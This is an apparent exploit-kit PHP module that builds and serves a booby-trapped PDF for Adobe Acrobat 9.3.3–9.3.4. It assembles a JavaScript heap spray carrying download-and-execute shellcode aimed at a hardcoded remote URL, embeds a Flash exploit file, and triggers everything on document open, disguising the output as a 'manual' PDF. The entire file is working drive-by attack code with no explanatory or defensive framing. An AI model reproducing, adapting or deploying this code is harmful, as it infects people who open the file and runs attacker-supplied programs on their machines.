<?php
#windows all aslr; Adobe acrobat 9.3.3 9.3.4

include_once('config.php');
include("include/util.php");
include("include/shellcode.php");

function generate_swf(){
	$swf = @file_get_contents("modules/helpers/Adobe-2010-2884.swf");
	return $swf;
}

function generate_js($url){

	$js = $js . "var padding = String.fromCharCode(37008) + String.fromCharCode(37008);";

	$js = $js . "var html = padding + '" . shellcode_dl_exec_js($url) . "';";	

	$js = $js . "while (padding.length < 65564){";
	$js = $js . "	padding+=padding;";
	$js = $js . "}";

	$js = $js . "var value = padding.substring(0, 0x5f4);";
	$js = $js . "value += html;";
	$js = $js . "value += padding;";
	$js = $js . "var destination = value.substring(0, 32768);";

	$js = $js . "while(1){";
	$js = $js . "	destination += destination;";
	$js = $js . "	if(destination.length >= 524288) break;";
	$js = $js . "}";
		
	$js = $js . "var today = destination.substring(0, 524288 - 2060);";
	$js = $js . "var forever = new Array();";
	$js = $js . "for (var infinite = 0; infinite < 496; infinite++){";
	$js = $js . "	forever[infinite]=today+'s';";
	$js = $js . "}";

	return $js;
	

}

function generate_pdf($url){
				
		$js = generate_js($url);
		$js = pdf_FlateEncode($js);		
		//$js = pdf_ASCII85Encode($js);
		$js = pdf_ASCIIHexEncode($js);		
		$jslen = strlen($js);

		$swf = generate_swf();
				
		//$swf = pdf_ASCII85Encode($swf);	
		$swf = pdf_ASCIIHexEncode($swf);			
		$swf = pdf_FlateEncode($swf);		
		$swflen = strlen($swf);

		$swfname = "Adobe.swf";
		
		$eol = "\n";
		$endobj = "endobj" . $eol;
		
		$xref = array();
		
		$pdf = "%PDF-1.7" . $eol;
		$pdf = $pdf . "%" . RandomNonASCIIString(4) . $eol;


		# catalog
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(1) . "<<";
		$pdf = $pdf . "/Pages " . ioRef(3);
		$pdf = $pdf . "/OpenAction " . ioRef(5);
		$pdf = $pdf . "/Type/Catalog>>";
		$pdf = $pdf . $eol . $endobj;

		# pages array
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(3) . "<</Count 1/Kids[" . ioRef(4) . "]/Type/Pages>>" . $eol . $endobj;

		# page 1
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(4) . "<</Parent " . ioRef(3);
		$pdf = $pdf . "/Annots [" . ioRef(7) . "] ";
		$pdf = $pdf . "/Type/Page>>";
		$pdf = $pdf . $eol . $endobj;

		# js action
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(5) . "<</JS " . ioRef(6) . "/S/JavaScript/Type/Action>>" . $eol . $endobj;

		# js stream
		$xref[] = strlen($pdf);		
		$pdf = $pdf . ioDef(6) . "<</Filter[/ASCIIHexDecode/FlateDecode]/Length " . $jslen . ">>" . $eol;		
		$pdf = $pdf . "stream" . $eol;
		$pdf = $pdf . $js . $eol;
		$pdf = $pdf . "endstream" . $eol;
		$pdf = $pdf . $endobj;

		# swf annotation object
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(7) . "<<";
		$pdf = $pdf . "/Rect [86.1384 585.793 313.138 753.793] ";
		$pdf = $pdf . "/RichMediaSettings " . ioRef(8);
		$pdf = $pdf . "/RichMediaContent " . ioRef(9);
		$pdf = $pdf . "/NM (" . $swfname . ")";
		$pdf = $pdf . "/Subtype/RichMedia/Type/Annot>>";
		$pdf = $pdf . $eol . $endobj;

		# rich media settings
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(8);
		$pdf = $pdf . "<</Subtype/application#2Fx-shockwave-flash";
		$pdf = $pdf . "/Activation " . ioRef(10);
		$pdf = $pdf . "/Deactivation " . ioRef(11);
		$pdf = $pdf . "/Type/RichMediaSettings>>";
		$pdf = $pdf . $eol . $endobj;

		# rich media content
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(9);
		$pdf = $pdf . "<<";
		$pdf = $pdf . "/Assets " . ioRef(12);
		$pdf = $pdf . "/Configurations [" . ioRef(14) . "]";
		$pdf = $pdf . "/Type/RichMediaContent>>";
		$pdf = $pdf . $eol . $endobj;

		# rich media activation / deactivation
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(10);
		$pdf = $pdf . "<</Condition/PO/Type/RichMediaActivation>>";
		$pdf = $pdf . $eol . $endobj;

		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(11);
		$pdf = $pdf . "<</Condition/XD/Type/RichMediaDeactivation>>";
		$pdf = $pdf . $eol . $endobj;

		# rich media assets
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(12);
		$pdf = $pdf . "<</Names [(" . $swfname . ") " . ioRef(13) . "]>>";
		$pdf = $pdf . $eol . $endobj;

		# swf embeded file ref
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(13);
		$pdf = $pdf . "<< /EF <</F " . ioRef(16) . ">> /F(" . $swfname . ")/Type/Filespec>>";
		$pdf = $pdf . $eol . $endobj;

		# rich media configuration
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(14);
		$pdf = $pdf . "<</Subtype/application#2Fx-shockwave-flash";
		$pdf = $pdf . "/Instances [" . ioRef(15) . "]/Type/RichMediaConfiguration>>";
		$pdf = $pdf . $eol . $endobj;

		# rich media isntance
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(15);
		$pdf = $pdf . "<</Subtype/application#2Fx-shockwave-flash";
		$pdf = $pdf . "/Asset " . ioRef(13);
		$pdf = $pdf . "/Type/RichMediaInstance>>";
		$pdf = $pdf . $eol . $endobj;

		# swf stream		
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(16) . "<</Filter[/FlateDecode/ASCIIHexDecode]/Length " . $swflen . "/Type/EmbeddedFile>>" . $eol;
		$pdf = $pdf . "stream" . $eol;
		$pdf = $pdf . $swf . $eol;
		$pdf = $pdf . "endstream" . $eol;
		$pdf = $pdf . $endobj;

		# trailing stuff
		$xrefPosition = strlen($pdf);
		
		$pdf = $pdf . "xref" . $eol;
		$pdf = $pdf . "0 " . (count($xref) + 1) . $eol;
		$pdf = $pdf . "0000000000 65535 f" . $eol;
		
		for($i = 0; $i < count($xref); $i++){
			$temp = sprintf("%010d 00000 n", $xref[$i]);
			$pdf = $pdf . $temp . $eol;
		}
		
		$pdf = $pdf . "trailer" . $eol;
		$pdf = $pdf . "<</Size " . (count($xref) + 1) . "/Root " . ioRef(1) . ">>" . $eol;
		$pdf = $pdf . "startxref" . $eol;
		$pdf = $pdf . $xrefPosition . $eol;
		$pdf = $pdf . "%%EOF" . $eol;

		return $pdf;
}

$pdf = generate_pdf("http://drztgoddobmyr.com/555/ble/download_file.php?e=Adobe-2010-2884");

header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Cache-Control: no-cache");
header("Pragma: no-cache");
header("Accept-Ranges: bytes\r\n");
header("Content-Length: " . strlen($pdf) . "\r\n");
header("Content-Disposition: inline; filename=manual20102884.pdf");
header("\r\n");
header("Content-Type: application/pdf\r\n\r\n");
echo $pdf;
?>
